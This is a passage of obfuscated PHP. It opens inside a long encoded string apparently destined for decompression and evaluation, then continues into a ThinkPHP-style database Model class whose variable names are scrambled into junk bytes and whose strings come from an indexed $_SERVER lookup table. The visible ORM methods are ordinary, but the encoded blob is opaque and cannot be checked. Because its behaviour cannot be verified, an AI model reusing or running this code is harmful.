21\316\314\361\44\155\166\0\271\204\174\266".strrev('í1w[”ö°R}à­<Bæ¸ìÓ?9BÉ…x´¹xq’–ËL¥’åy¥ïpO¶\';‰ôü')."\x70\xad\x2b\x83\xa4\x5b\x4f\x44\x79\xa7\xdd\x6f\xb4\x90\x48\x2\x66\x1e\x51\xa1\x4\xe9\xde\xce\x7d\x6d\xca\x1d\xc9\x97\xa0\xcd\xa2\x11\x95\xa2\x49\x2e\xe6\x68\xf\xfd\x62\x93\xc5\x88\xf0\xa3".strrev('y„b‚Ci÷ ¯rğ<8‘lÃeƒ¢$÷®&z\\/+"šÉt¼lıË›ÜzHDé¢A')."\72\335\242\15\225\111\232\146\254\11\207\42\10\117\112\50\56\311\12\132\350\312\353\303\336\307\240\3\262\345\264\53\141\51\124\130\111\113\371\305\215\212\350\46\206\225\353\76"."\xd9\x68\xee\xec\xb2\x15\x36\x5f\x54\x2\x44\x5f\xd9\xe0\xea\x59\x12\x13\x84\x8d\x44\x84\xde\x16\xed\xa\xe7\xf5\x45\x95\x6e\x9b\x6f\x9e\x8c\xcf\x19\x4a\x43\x4c\x72\xfc\x2e\xa8\x87\xad\xc3\x62"."\25\106\76\170\242\154\371\41\147\367\335\251\54\174\220\226\200\236\215\112\305\311\367\252\143\146\110\224\257\104\254\112\367\20\113\306\362\42\202\35\165\246\153\360\45\24\311\73".base64_decode('BinjcqSrOd6pJRyJWL4UmCMyXRoXckfR9Lqn9XIGb89oDnvYcFIZiU0qjSyFWyWD').base64_decode('ChWVb6+3VWxMvcyjKKSkPZJyRtIsk4e2qGw2GoVzCtrVlXeMIcB5aRTOWxLNMkuy').base64_decode('FimfoxXtMbpXOngggEiX6bCHTadJxxrPsolLq4MV501NJBblWyEEDZ5L8nKtKJt4')."\314\126\210\324\236\123\240\34\256\145\61\145\260\253\320\226\50\305\343\42\256\214\356\6\55\23\237\321\262\243\255\62\321\262\42\110\171\125\221\170\331\255\157\273\165\70\74\160"."\171\140\300\117\53\120\127\260\332\20\333\230\65\6\204\312\33\123\127\237\344\302\357\305\374\100\336\344\147\106\132\250\43\142\125\352\220\345\35\310\222\322\334\353\64\137\224\134"."\xdf\x96\xd5\x9e\xf7\x61\x26\xbf\x94\x9d\xce\x6a\xec\x1a\x40\x32\x3b\xa0\x2c\x8f\xe9\x18\x29\xdd\xed\x5f\x57\xf6\xb7\x45\xe3\x59\x25\x59\x49\x50\xe8\x91\xd1\x9\x91\x83\x4b\xc7\xa0\x8c\x14\x8b"."\x80\x80\xae\x13\xe2\x72\x5a\x9e\x44\xb1\x88\x35\xe1\x32\xf7\xa0\x74\x2\xdc\x32\xd0\xb\xca\x26\x7c\x11\xce\xaf\xa6\x88\x6f\x58\x7a\xae\xd2\xe8\x84\x69\x39\x3e\x1c\x97\x34\xb\xe4\xb7\xd1\x74"."\x1c\x71\x61\x4f\x79\x7c\x42\xc\xe2\xc3\xd1\x27\xe9\xa3\xa0\x2f\x71\xf\x85\x1b\x45\x2e\x38\xc8\xb2\x25\xe8\x85\x7c\xc2\x55\x29\x66\x9e\x13\x3a\x8d\x25\x48\xc9\x15\xc0\x17\x27\x3c\x20\x9f\x7d".base64_decode('cGXaUvRc6goAYk57zRHmeRObmYv2iKsVMmSCPoHlJ2vUEAN+O0hjgvBig1/DhCK8')."\xfc\x16\x58\x55\xe8\x77\x65\xa7\xef\x67\x71\x2d\xd4\x6f\x2a\x1\x44\xaa\xa2\x8\xea\xae\x9d\x30\xe2\x60\x97\x93\x48\x26\x4a\xa2\x3a\x42\x89\xc4\xd2\x58\xbc\x99\x7a\x77\x2f\x89\x26\xb9\x24\xd"."\xa5\x92\xa8\x8e\xd6\x58\xfb\x58\x71\xe1\xb6\x50\x24\x5a\x12\x87\x95\x99\xda\x55\xe1\x22\x8d\x46\x45\x3a\x48\x2b\xc9\x8d\xe0\x58\xad\x88\x34\x2d\x12\x2d\x21\x77\xcf\x42\x52\x5f\xc8\x98\x4c\x0"."\xcf\x6e\x32\x12\x5a\x96\x71\xe9\x92\x91\xa9\x9e\x13\xbe\xf1\x44\x9e\xbc\x91\x1a\x10\x92\x3e\x4d\x22\xde\x6d\xe6\xc4\x92\x7f\xb8\x9f\x4a\xf2\xe8\xc\xb2\x45\xa\x5\x61\x45\xa4\x76\x28\x3b\x5e"."\x0\x28\xf6\x76\xcf\xf7\x3a\x27\xa4\xc5\x65\x7a\xc0\x75\xe9\x2e\xc1\xc9\x7e\x20\x8\x46\x5a\x73\xf2\x41\x4b\x0\x93\xcb\xe\x90\x2c\xe5\x2d\xbd\x75\x20\xb1\x62\x0\x70\xc3\x8e\x67\x6f\xf6\xae"."\x32\x7b\xa5\x5b\x5\xca\xc6\x80\xc9\x27\xc\xa9\xa4\x6c\x46\xbf\x5d\xd1\x8e\xd6\x5f\xf6\xee\x99\x8a\xf6\xf0\x8e\x17\x42\xb7\xff\x3\x71\x83\x25\xca\x2e\xac\x0\x0", 10, -8))); goto FºÀ…Êùğ; cÊ·æ‚†’: class Model extends ClassBaseCall { private $_extModel = null; protected $db = null; protected $pk = "\151\144"; protected $tablePrefix = ''; protected $name = ''; protected $dbName = ''; protected $connection = ''; protected $tableName = ''; protected $trueTableName = ''; protected $error = ''; protected $fields = array(); protected $data = array(); protected $options = array(); protected $_validate = array(); protected $_auto = array(); protected $_map = array(); protected $_scope = array(); protected $autoCheckFields = true; protected $patchValidate = false; protected $methods = array("\164\141\142\x6c\145", "\157\162\x64\x65\x72", "\x61\154\x69\141\163", "\150\141\166\x69\x6e\x67", "\147\162\x6f\x75\x70", "\154\x6f\x63\x6b", "\144\x69\x73\x74\151\156\x63\164", "\141\x75\x74\x6f", "\x66\x69\154\164\x65\162", "\166\141\x6c\x69\144\141\164\x65", "\162\145\x73\165\x6c\x74", "\x62\151\x6e\144", "\164\x6f\153\x65\x6e"); public function __construct($¼ÃèáÉ = '', $ıÔÕµ¦Æ = '', $³¯ËúÑ = '') { $ö…›š°º =& $_SERVER[Îûáû“ş]; $this->_initialize(); if (!empty($¼ÃèáÉ)) { if (strpos($¼ÃèáÉ, $ö…›š°º[10])) { list($this->dbName, $this->name) = explode($ö…›š°º[10], $¼ÃèáÉ); } else { $this->name = $¼ÃèáÉ; } } elseif (empty($this->name)) { $this->name = $this->getModelName(); } if (is_null($ıÔÕµ¦Æ)) { $this->tablePrefix = $ö…›š°º[12]; } elseif ($ö…›š°º[12] != $ıÔÕµ¦Æ) { $this->tablePrefix = $ıÔÕµ¦Æ; } else { $this->tablePrefix = $this->tablePrefix ? $this->tablePrefix : think_config($ö…›š°º[244]); } $this->db(0, empty($this->connection) ? $³¯ËúÑ : $this->connection); $this->_classObjectID = mt_rand(0, 10000); } protected function _checkTableInfo() { $ª”’Ãçà =& $_SERVER[Îûáû“ş]; if (empty($this->fields)) { if (think_config($ª”’Ãçà[245])) { $ï„¸¥ş = $this->dbName ? $this->dbName : think_config($ª”’Ãçà[246]); $×ºôšÄû = think_var_cache($ª”’Ãçà[247] . strtolower(get_path_this($ï„¸¥ş) . $ª”’Ãçà[10] . $this->name)); if ($×ºôšÄû) { $ç¨éÒÆŞ = think_config($ª”’Ãçà[248]); if (empty($ç¨éÒÆŞ) || $×ºôšÄû[$ª”’Ãçà[249]] == $ç¨éÒÆŞ) { $this->fields = $×ºôšÄû; return; } } } $this->flush(); } } public function flush() { $ÈÛåãã£ =& $_SERVER[Îûáû“ş]; $this->db->setModel($this->name); $†ãºØŸÉ = $this->db->getFields($this->getTableName()); if (!$†ãºØŸÉ) { return !1; } $this->fields = array_keys($†ãºØŸÉ); $this->fields[$ÈÛåãã£[250]] = !1; foreach ($†ãºØŸÉ as $½¤ûÎøˆ => $¸¶Ôµ§) { $ã”ºøÔì[$½¤ûÎøˆ] = $¸¶Ôµ§[$ÈÛåãã£[33]]; if ($¸¶Ôµ§[$ÈÛåãã£[39]]) { $this->fields[$ÈÛåãã£[251]] = $½¤ûÎøˆ; if ($¸¶Ôµ§[$ÈÛåãã£[42]]) { $this->fields[$ÈÛåãã£[250]] = !0; } } } $this->fields[$ÈÛåãã£[252]] = $ã”ºøÔì; if (think_config($ÈÛåãã£[248])) { $this->fields[$ÈÛåãã£[249]] = think_config($ÈÛåãã£[248]); } if (think_config($ÈÛåãã£[245])) { $©ºªÆ¢ = $this->dbName ? $this->dbName : think_config($ÈÛåãã£[246]); think_var_cache($ÈÛåãã£[247] . strtolower(get_path_this($©ºªÆ¢) . $ÈÛåãã£[10] . $this->name), $this->fields); } } public function switchModel($’ñÆÓ”„, $‘ßú»¯õ = array()) { $ğ‰ùÉ­Á =& $_SERVER[Îûáû“ş]; $å•µ˜ıè = ucwords(strtolower($’ñÆÓ”„)) . $ğ‰ùÉ­Á[253]; if (!class_exists($å•µ˜ıè)) { think_exception($å•µ˜ıè . think_lang($ğ‰ùÉ­Á[254])); } $this->_extModel = new $å•µ˜ıè($this->name); if (!empty($‘ßú»¯õ)) { foreach ($‘ßú»¯õ as $Ú¹Ğº¾”) { $this->_extModel->setProperty($Ú¹Ğº¾”, $this->{$Ú¹Ğº¾”}); } } return $this->_extModel; } public function __set($¢ÈÁ°ù, $óÏšàÜ) { $this->data[$¢ÈÁ°ù] = $óÏšàÜ; } public function __get($€“¨ê¶¬) { return isset($this->data[$€“¨ê¶¬]) ? $this->data[$€“¨ê¶¬] : null; } public function __isset($íıÛ›ò£) { return isset($this->data[$íıÛ›ò£]); } public function __unset($©–··§™) { unset($this->data[$©–··§™]); } public function __call($¹Ãœ‡òö, $Êù¹Ôáô) { $±¡Äê½­ =& $_SERVER[Îûáû“ş]; if (in_array(strtolower($¹Ãœ‡òö), $this->methods, !0)) { $this->options[strtolower($¹Ãœ‡òö)] = $Êù¹Ôáô[0]; return $this; } elseif (in_array(strtolower($¹Ãœ‡òö), array($±¡Äê½­[255], $±¡Äê½­[256], $±¡Äê½­[257], $±¡Äê½­[258], $±¡Äê½­[259]), !0)) { $ÍµıŠê = isset($Êù¹Ôáô[0]) ? $Êù¹Ôáô[0] : $±¡Äê½­[189]; $ÍµıŠê = $this->db->parseKey($ÍµıŠê); return $this->getField(strtoupper($¹Ãœ‡òö) . $±¡Äê½­[260] . $ÍµıŠê . $±¡Äê½­[261] . $¹Ãœ‡òö, $±¡Äê½­[255]); } elseif (strtolower(substr($¹Ãœ‡òö, 0, 5)) == $±¡Äê½­[262]) { $ÍµıŠê = think_parse_name(substr($¹Ãœ‡òö, 5)); $îëœ¾¨û[$ÍµıŠê] = $Êù¹Ôáô[0]; return $this->where($îëœ¾¨û)->find(); } elseif (strtolower(substr($¹Ãœ‡òö, 0, 10)) == $±¡Äê½­[263]) { $ÕŒ¹ºØ· = think_parse_name(substr($¹Ãœ‡òö, 10)); $îëœ¾¨û[$ÕŒ¹ºØ·] = $Êù¹Ôáô[0]; return $this->where($îëœ¾¨û)->getField($Êù¹Ôáô[1]); } elseif (isset($this->_scope[$¹Ãœ‡òö])) { return $this->scope($¹Ãœ‡òö, $Êù¹Ôáô[0]); } elseif (method_exists($this, $¹Ãœ‡òö)) { array_unshift($Êù¹Ôáô, $¹Ãœ‡òö); return call_user_func_array(array($this, $±¡Äê½­[264]), $Êù¹Ôáô); } else { return call_user_func_array(array(parent, $¹Ãœ‡òö), $Êù¹Ôáô); } } protected function call() { $Ÿ†½Ê½ä =& $_SERVER[Îûáû“ş]; $ÀŒŒ­¨Í = func_get_args(); $É¦õ¡Ÿ = array_shift($ÀŒŒ­¨Í); $´ÌÖŠÉ˜ = $É¦õ¡Ÿ; if (is_array($É¦õ¡Ÿ)) { $´ÌÖŠÉ˜ = $É¦õ¡Ÿ[1]; $É¦õ¡Ÿ = $É¦õ¡Ÿ[0]; } $â‹şû³ = count($ÀŒŒ­¨Í) - 1; if (isset($ÀŒŒ­¨Í[$â‹şû³]) && $ÀŒŒ­¨Í[$â‹şû³] === $É¦õ¡Ÿ) { think_exception(__CLASS__ . $Ÿ†½Ê½ä[4] . $É¦õ¡Ÿ . think_lang($Ÿ†½Ê½ä[265])); return; } $ÀŒŒ­¨Í[] = $É¦õ¡Ÿ; if (method_exists($this, $Ÿ†½Ê½ä[266])) { $€¥ù “ = call_user_func_array(array($this, $Ÿ†½Ê½ä[267]), array($´ÌÖŠÉ˜, $ÀŒŒ­¨Í)); if (!is_null($€¥ù “) && $€¥ù “ !== !1) { return $€¥ù “; } } $µ¿Õ§Šß = call_user_func_array(array($this, $É¦õ¡Ÿ), $ÀŒŒ­¨Í); if (method_exists($this, $Ÿ†½Ê½ä[268])) { $€¥ù “ = call_user_func_array(array($this, $Ÿ†½Ê½ä[269]), array($´ÌÖŠÉ˜, $ÀŒŒ­¨Í, $µ¿Õ§Šß)); if ($€¥ù “) { return $€¥ù “; } } return $µ¿Õ§Šß; } protected function _initialize() { } protected function _facade($“Ü¹ÛÅİ) { $ÂŞíï³ =& $_SERVER[Îûáû“ş]; if (!empty($this->fields)) { foreach ($“Ü¹ÛÅİ as $¡×¥ùª => $Şû¯è€) { if (is_array($this->fields) && !in_array($¡×¥ùª, $this->fields, !0)) { unset($“Ü¹ÛÅİ[$¡×¥ùª]); } elseif (is_scalar($Şû¯è€)) { $this->_parseType($“Ü¹ÛÅİ, $¡×¥ùª); } } } if (!empty($this->options[$ÂŞíï³[270]])) { $“Ü¹ÛÅİ = array_map($this->options[$ÂŞíï³[270]], $“Ü¹ÛÅİ); unset($this->options[$ÂŞíï³[270]]); } $this->_beforeWrite($“Ü¹ÛÅİ); return $“Ü¹ÛÅİ; } protected function _beforeWrite(&$ÕÏ×œ¢’) { } public function add($ĞË”´ôì = '', $àÁİµ£ğ = array(), $ñÛ£êÂ§ = false) { if (empty($ĞË”´ôì)) { if (!empty($this->data)) { $ĞË”´ôì = $this->data; $this->data = array(); } else { $this->error = think_lang($_SERVER[Îûáû“ş][271]); return !1; } } $àÁİµ£ğ = $this->_parseOptions($àÁİµ£ğ); $ĞË”´ôì = $this->_facade($ĞË”´ôì); if (!1 === $this->_beforeInsert($ĞË”´ôì, $àÁİµ£ğ)) { return !1; } $Ó€ÌÙø = $this->db->insert($ĞË”´ôì, $àÁİµ£ğ, $ñÛ£êÂ§); if (!1 !== $Ó€ÌÙø) { $Ó°»ë¯ = $this->getLastInsID(); if ($Ó°»ë¯) { $ĞË”´ôì[$this->getPk()] = $Ó°»ë¯; $this->_after_insert($ĞË”´ôì, $àÁİµ£ğ); return $Ó°»ë¯; } $this->_after_insert($ĞË”´ôì, $àÁİµ£ğ); } return $Ó€ÌÙø; } protected function _beforeInsert(&$É‰Ã §â, $µµŒäÈñ) { } protected function _after_insert($ôƒÂÍ³, $¬òÌ™İÔ) { } public function addAll($¤îôŸ¹¦, $º¯¶Èñ = array(), $àÄÅöÁ = false) { $øÀ‘ìÀ¦ =& $_SERVER[Îûáû“ş]; if (empty($¤îôŸ¹¦)) { $this->error = think_lang($øÀ‘ìÀ¦[271]); return !1; } $º¯¶Èñ = $this->_parseOptions($º¯¶Èñ); foreach ($¤îôŸ¹¦ as $ªÈùá°Ò => $Ø¦Å¯µ€) { $¤îôŸ¹¦[$ªÈùá°Ò] = $this->_facade($Ø¦Å¯µ€); } if (method_exists($this->db, $øÀ‘ìÀ¦[272])) { $ÎÒª§÷ = $this->db->insertAll($¤îôŸ¹¦, $º¯¶Èñ, $àÄÅöÁ); } else { $this->startTrans(); foreach ($¤îôŸ¹¦ as $ªÈùá°Ò => $Ø¦Å¯µ€) { $ÎÒª§÷ = $this->db->insert($Ø¦Å¯µ€, $º¯¶Èñ, $àÄÅöÁ); } $this->commit(); } if (!1 !== $ÎÒª§÷) { $ß¢ÛƒÍê = $this->getLastInsID(); if ($ß¢ÛƒÍê) { return $ß¢ÛƒÍê; } } return $ÎÒª§÷; } public function selectAdd($£ÉœÙ˜÷ = '', $æèˆµø¬ = '', $ş’íŒøÓ = array()) { $“É¦Ã• =& $_SERVER[Îûáû“ş]; $ş’íŒøÓ = $this->_parseOptions($ş’íŒøÓ); if (!1 === ($‘Ñ•ÛÖ÷ = $this->db->selectInsert($£ÉœÙ˜÷ ? $£ÉœÙ˜÷ : $ş’íŒøÓ[$“É¦Ã•[273]], $æèˆµø¬ ? $æèˆµø¬ : $this->getTableName(), $ş’íŒøÓ))) { $this->error = think_lang($“É¦Ã•[274]); return !1; } else { return $‘Ñ•ÛÖ÷; } } public function save($îÜ¸ïÓÚ = '', $™ÁÛœüå = array()) { $ª¬‹—¬ =& $_SERVER[Îûáû“ş]; if (empty($îÜ¸ïÓÚ)) { if (!empty($this->data)) { $îÜ¸ïÓÚ = $this->data; $this->data = array(); } else { $this->error = think_lang($ª¬‹—¬[271]); return !1; } } $îÜ¸ïÓÚ = $this->_facade($îÜ¸ïÓÚ); $™ÁÛœüå = $this->_parseOptions($™ÁÛœüå); $Ê«‹…Ç· = $this->getPk(); if (!isset($™ÁÛœüå[$ª¬‹—¬[275]])) { if (isset($îÜ¸ïÓÚ[$Ê«‹…Ç·])) { $©ğ¼¡Š[$Ê«‹…Ç·] = $îÜ¸ïÓÚ[$Ê«‹…Ç·]; $™ÁÛœüå[$ª¬‹—¬[275]] = $©ğ¼¡Š; unset($îÜ¸ïÓÚ[$Ê«‹…Ç·]); } else { $this->error = think_lang($ª¬‹—¬[274]); return !1; } } if (is_array($™ÁÛœüå[$ª¬‹—¬[275]]) && isset($™ÁÛœüå[$ª¬‹—¬[275]][$Ê«‹…Ç·])) { $«ßå½õß = $™ÁÛœüå[$ª¬‹—¬[275]][$Ê«‹…Ç·]; } if (!1 === $this->_beforeUpdate($îÜ¸ïÓÚ, $™ÁÛœüå)) { return !1; } $ ÑßÔ¥Ò = $this->db->update($îÜ¸ïÓÚ, $™ÁÛœüå); if (!1 !== $ ÑßÔ¥Ò) { if (isset($«ßå½õß)) { $îÜ¸ïÓÚ[$Ê«‹…Ç·] = $«ßå½õß; } $this->_afterUpdate($îÜ¸ïÓÚ, $™ÁÛœüå); } return $ ÑßÔ¥Ò; } protected function _beforeUpdate(&$ÔàøüÊ, $½ıìºôº) { } protected function _afterUpdate($ß ©î½Œ, $ø›¿½¼í) { } public function delete($öõï¤¼Ø = array()) { $ÙÇïÏÓŒ =& $_SERVER[Îûáû“ş]; if (empty($öõï¤¼Ø) && empty($this->options[$ÙÇïÏÓŒ[275]])) { if (!empty($this->data) && isset($this->data[$this->getPk()])) { return $this->delete($this->data[$this->getPk()]); } else { return !1; } } $°áøÖìó = $this->getPk(); if (is_numeric($öõï¤¼Ø) || is_string($öõï¤¼Ø)) { if (strpos($öõï¤¼Ø, $ÙÇïÏÓŒ[50])) { $à¥ñ¹ğÄ[$°áøÖìó] = array($ÙÇïÏÓŒ[276], $öõï¤¼Ø); } else { $à¥ñ¹ğÄ[$°áøÖìó] = $öõï¤¼Ø; } $this->options[$ÙÇïÏÓŒ[275]] = $à¥ñ¹ğÄ; } $öõï¤¼Ø = $this->_parseOptions(); if (is_array($öõï¤¼Ø[$ÙÇïÏÓŒ[275]]) && isset($öõï¤¼Ø[$ÙÇïÏÓŒ[275]][$°áøÖìó])) { $„ïñïÛ½ = $öõï¤¼Ø[$ÙÇïÏÓŒ[275]][$°áøÖìó]; } $»²Å¤óâ = $this->db->delete($öõï¤¼Ø); if (!1 !== $»²Å¤óâ) { $¨‰ÙçÒİ = array(); if (isset($„ïñïÛ½)) { $¨‰ÙçÒİ[$°áøÖìó] = $„ïñïÛ½; } $this->_after_delete($¨‰ÙçÒİ, $öõï¤¼Ø); } return $»²Å¤óâ; } protected function _after_delete($¸µÔ€Ç, $æî¸÷øå) { } public function select($ƒÆÉ«Åª = array()) { $ËÄË·Ö =& $_SERVER[Îûáû“ş]; if (is_string($ƒÆÉ«Åª) || is_numeric($ƒÆÉ«Åª)) { $Äˆ…°® = $this->getPk(); if (strpos($ƒÆÉ«Åª, $ËÄË·Ö[50])) { $€¿ƒ¡®[$Äˆ…°®] = array($ËÄË·Ö[276], $ƒÆÉ«Åª); } else { $€¿ƒ¡®[$Äˆ…°®] = $ƒÆÉ«Åª; } $this->options[$ËÄË·Ö[275]] = $€¿ƒ¡®; } elseif (!1 === $ƒÆÉ«Åª) { $ƒÆÉ«Åª = $this->_parseOptions(); return $ËÄË·Ö[277] . $this->db->buildSelectSql($ƒÆÉ«Åª) . $ËÄË·Ö[278]; } $ƒÆÉ«Åª = $this->_parseOptions(); $Ñº©Ÿ‹Ş = $this->db->select($ƒÆÉ«Åª); if (!1 === $Ñº©Ÿ‹Ş) { return !1; } if (empty($Ñº©Ÿ‹Ş)) { return null; } $this->_afterSelect($Ñº©Ÿ‹Ş, $ƒÆÉ«Åª); return $Ñº©Ÿ‹Ş; } protected function _afterSelect(&$ôÔˆô—Ö, $¢‘ôğã) { } public function buildSql($©ÄšŠÉÜ = array()) { $ó‹Ùˆ÷ =& $_SERVER[Îûáû“ş]; $©ÄšŠÉÜ = $this->_parseOptions($©ÄšŠÉÜ); return $ó‹Ùˆ÷[277] . $this->db->buildSelectSql($©ÄšŠÉÜ) . $ó‹Ùˆ÷[278]; } public function optionsValue($ÉãİÖïŸ = null) { if (is_null($ÉãİÖïŸ)) { return $this->options; } elseif (is_array($ÉãİÖïŸ)) { $this->options = array_merge($this->options, $ÉãİÖïŸ); } } protected function _parseOptions($æ£·Í›ƒ = array()) { $óĞ¡Åšø =& $_SERVER[Îûáû“ş]; if (is_array($æ£·Í›ƒ)) { $æ£·Í›ƒ = array_merge($this->options, $æ£·Í›ƒ); } $this->options = array(); if (!isset($æ£·Í›ƒ[$óĞ¡Åšø[279]])) { $æ£·Í›ƒ[$óĞ¡Åšø[279]] = $this->getTableName(); $çºÂêâï = $this->fields; } else { $çºÂêâï = $this->getDbFields(); } if (!empty($æ£·Í›ƒ[$óĞ¡Åšø[280]])) { $æ£·Í›ƒ[$óĞ¡Åšø[279]] .= $óĞ¡Åšø[53] . $æ£·Í›ƒ[$óĞ¡Åšø[280]]; } $æ£·Í›ƒ[$óĞ¡Åšø[281]] = $this->name; if (isset($æ£·Í›ƒ[$óĞ¡Åšø[275]]) && is_array($æ£·Í›ƒ[$óĞ¡Åšø[275]]) && !empty($çºÂêâï) && !isset($æ£·Í›ƒ[$óĞ¡Åšø[282]]) && !isset($æ£·Í›ƒ[$óĞ¡Åšø[279]])) { foreach ($æ£·Í›ƒ[$óĞ¡Åšø[275]] as $Õ¿“³û­ => $ÇîÖŒ¶É) { $Õ¿“³û­ = trim($Õ¿“³û­); if (in_array($Õ¿“³û­, $çºÂêâï, !0)) { if (is_scalar($ÇîÖŒ¶É)) { $this->_parseType($æ£·Í›ƒ[$óĞ¡Åšø[275]], $Õ¿“³û­); } } elseif (!is_numeric($Õ¿“³û­) && $óĞ¡Åšø[11] != substr($Õ¿“³û­, 0, 1) && !1 === strpos($Õ¿“³û­, $óĞ¡Åšø[10]) && !1 === strpos($Õ¿“³û­, $óĞ¡Åšø[260]) && !1 === strpos($Õ¿“³û­, $óĞ¡Åšø[283]) && !1 === strpos($Õ¿“³û­, $óĞ¡Åšø[284])) { unset($æ£·Í›ƒ[$óĞ¡Åšø[275]][$Õ¿“³û­]); } } } $this->_options_filter($æ£·Í›ƒ); return $æ£·Í›ƒ; } protected function _options_filter(&$±â‚¶í‹) { } protected function _parseType(&$ÌäÙé¾›, $öÇİ‚Å†) { $İû™©×ù =& $_SERVER[Îûáû“ş]; if (empty($this->options[$İû™©×ù[285]][$İû™©×ù[4] . $öÇİ‚Å†])) { $›ÅÜ”Š = strtolower($this->fields[$İû™©×ù[252]][$öÇİ‚Å†]); if (!1 !== strpos($›ÅÜ”Š, $İû™©×ù[286])) { } elseif (!1 === strpos($›ÅÜ”Š, $İû™©×ù[287]) && !1 !== strpos($›ÅÜ”Š, $İû™©×ù[288])) { $ÌäÙé¾›[$öÇİ‚Å†] = intval($ÌäÙé¾›[$öÇİ‚Å†]); } elseif (!1 !== strpos($›ÅÜ”Š, $İû™©×ù[289]) || !1 !== strpos($›ÅÜ”Š, $İû™©×ù[290])) { $ÌäÙé¾›[$öÇİ‚Å†] = floatval($ÌäÙé¾›[$öÇİ‚Å†]); } elseif (!1 !== strpos($›ÅÜ”Š, $İû™©×ù[291])) { $ÌäÙé¾›[$öÇİ‚Å†] = (bool) $ÌäÙé¾›[$öÇİ‚Å†]; } } } public function find($ÜÁ°ÛóÄ = array()) { $µ­Šø› =& $_SERVER[Îûáû“ş]; if (is_numeric($ÜÁ°ÛóÄ) || is_string($ÜÁ°ÛóÄ)) { $–›ƒ¶¿ß[$this->getPk()] = intval($ÜÁ°ÛóÄ); $this->options[$µ­Šø›[275]] = $–›ƒ¶¿ß; } $this->options[$µ­Šø›[292]] = 1; $ÜÁ°ÛóÄ = $this->_parseOptions(); $ÄÔ¢“˜ = $this->db->select($ÜÁ°ÛóÄ); if (!1 === $ÄÔ¢“˜) { return !1; } if (empty($ÄÔ¢“˜)) { return null; } $this->data = $ÄÔ¢“˜[0]; $this->_afterFind($this->data, $ÜÁ°ÛóÄ); if (!empty($this->options[$µ­Šø›[293]])) { return $this->returnResult($this->data, $this->options[$µ­Šø›[293]]); } return $this->data; } protected function _afterFind(&$ãÈêéê×, $û…Æ¶§) { } protected function returnResult($Ö†¡”ÏÎ, $æ’‰ÛäŠ = '') { $ÊÛİœªÏ =& $_SERVER[Îûáû“ş]; if ($æ’‰ÛäŠ) { if (is_callable($æ’‰ÛäŠ)) { return call_user_func($æ’‰ÛäŠ, $Ö†¡”ÏÎ); } switch (strtolower($æ’‰ÛäŠ)) { case $ÊÛİœªÏ[294]: return json_encode($Ö†¡”ÏÎ); case $ÊÛİœªÏ[295]: return xml_encode($Ö†¡”ÏÎ); } } return $Ö†¡”ÏÎ; } public function parseFieldsMap($·ş±à•, $İó¾Õ¥µ = 1) { if (!empty($this->_map)) { foreach ($this->_map as $‰©“­Ã => $ÓòÄËØ) { if ($İó¾Õ¥µ == 1) { if (isset($·ş±à•[$ÓòÄËØ])) { $·ş±à•[$‰©“­Ã] = $·ş±à•[$ÓòÄËØ]; unset($·ş±à•[$ÓòÄËØ]); } } else { if (isset($·ş±à•[$‰©“­Ã])) { $·ş±à•[$ÓòÄËØ] = $·ş±à•[$‰©“­Ã]; unset($·ş±à•[$‰©“­Ã]); } } } } return $·ş±à•; } public function setField($¸Œá–¥, $Ú‡ ¯Õ§ = '') { if (is_array($¸Œá–¥)) { $Ç²çÙ­© = $¸Œá–¥; } else { $Ç²çÙ­©[$¸Œá–¥] = $Ú‡ ¯Õ§; } return $this->save($Ç²çÙ­©); } public function setAdd($¼ş¯ „İ, $ïÇ´¿ = 1) { $¤Ö”¼… =& $_SERVER[Îûáû“ş]; $™Îşí€È = $¼ş¯ „İ . $¤Ö”¼…[296] . $ïÇ´¿; if ($ïÇ´¿ < 0) { $™Îşí€È = $¼ş¯ „İ . $ïÇ´¿; } return $this->setField($¼ş¯ „İ, array($¤Ö”¼…[297], $™Îşí€È)); } public function getField($Ò¼Ä’ı, $µãÍâæ = null) { $ˆûé‰¦Á =& $_SERVER[Îûáû“ş]; $äÚÊ¤Ë[$ˆûé‰¦Á[273]] = $Ò¼Ä’ı; $äÚÊ¤Ë = $this->_parseOptions($äÚÊ¤Ë); $Ò¼Ä’ı = trim($Ò¼Ä’ı); if (strpos($Ò¼Ä’ı, $ˆûé‰¦Á[50])) { if (!isset($äÚÊ¤Ë[$ˆûé‰¦Á[292]])) { $äÚÊ¤Ë[$ˆûé‰¦Á[292]] = is_numeric($µãÍâæ) ? $µãÍâæ : $ˆûé‰¦Á[12]; } $—ìğ»ù° = $this->db->select($äÚÊ¤Ë); if (!empty($—ìğ»ù°)) { $÷‚¿µï = explode($ˆûé‰¦Á[50], $Ò¼Ä’ı); $Ò¼Ä’ı = array_keys($—ìğ»ù°[0]); $µı½Òë¨ = array_shift($Ò¼Ä’ı); $ŒÍÈåË = array_shift($Ò¼Ä’ı); $¼£›úÆ¬ = array(); $ı‰õè®ä = count($÷‚¿µï); foreach ($—ìğ»ù° as $ÏËôË§å) { $Ö«ë‰°° = $ÏËôË§å[$µı½Òë¨]; if (2 == $ı‰õè®ä) { $¼£›úÆ¬[$Ö«ë‰°°] = $ÏËôË§å[$ŒÍÈåË]; } else { $¼£›úÆ¬[$Ö«ë‰°°] = is_string($µãÍâæ) ? implode($µãÍâæ, $ÏËôË§å) : $ÏËôË§å; } } return $¼£›úÆ¬; } } else { if (!0 !== $µãÍâæ) { $äÚÊ¤Ë[$ˆûé‰¦Á[292]] = is_numeric($µãÍâæ) ? $µãÍâæ : 1; } if ($µãÍâæ === $ˆûé‰¦Á[255]) { unset($äÚÊ¤Ë[$ˆûé‰¦Á[292]]); } $ÏËôË§å = $this->db->select($äÚÊ¤Ë); if (!empty($ÏËôË§å)) { if ($µãÍâæ === $ˆûé‰¦Á[255]) { return reset($ÏËôË§å[0]); } if (!0 !== $µãÍâæ && 1 == $äÚÊ¤Ë[$ˆûé‰¦Á[292]]) { return reset($ÏËôË§å[0]); } foreach ($ÏËôË§å as $Ğšéù­ä) { $†İ‰–’Ù[] = $Ğšéù­ä[$Ò¼Ä’ı]; } return $†İ‰–’Ù; } } return null; } public function create($§úı«Õç = '', $ôåû¨Ê™ = '') { $ŠÕ•¸íÉ =& $_SERVER[Îûáû“ş]; if (empty($§úı«Õç)) { $§úı«Õç = $_POST; } elseif (is_object($§úı«Õç)) { $§úı«Õç = get_object_vars($§úı«Õç); } if (empty($§úı«Õç) || !is_array($§úı«Õç)) { $this->error = think_lang($ŠÕ•¸íÉ[271]); return !1; } $§úı«Õç = $this->parseFieldsMap($§úı«Õç, 0); $ôåû¨Ê™ = $ôåû¨Ê™ ? $ôåû¨Ê™ : (!empty($§úı«Õç[$this->getPk()]) ? THINK_MODEL_UPDATE : 